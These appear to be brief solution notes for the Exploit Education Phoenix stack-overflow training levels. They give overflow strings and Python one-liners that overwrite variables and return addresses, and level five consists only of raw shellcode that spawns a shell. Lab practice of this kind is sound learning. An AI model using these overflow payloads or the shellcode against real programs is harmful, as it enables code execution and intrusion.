## ZERO
run stack-zero
enter `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa` to buffer overflow the changeme
## ONE
./stack-one aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabYlI
## TWO
Run export ExploitEducation=`python -c 'print ("a" * 64 + "\x0a\x09\x0a\x0d")'`
This sets the environment variable to override changeme.
Then run stack-two
## THREE
`objdump -t stack-three` to get the symbol table. complete_level function is located at 000000000040069d. Then run the command to overflow and call the function:
echo `python -c 'print("a" * 64 + "\x9d\x06\x40\x00")'` | ./stack-three
## FOUR
`objdump -t stack-four` to get address off complete_level (000000000040061d). Then run command:
`echo `python -c 'print("a" * 88 + "\x1d\x06\x40\x00")'` | ./stack-four`
## FIVE
\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68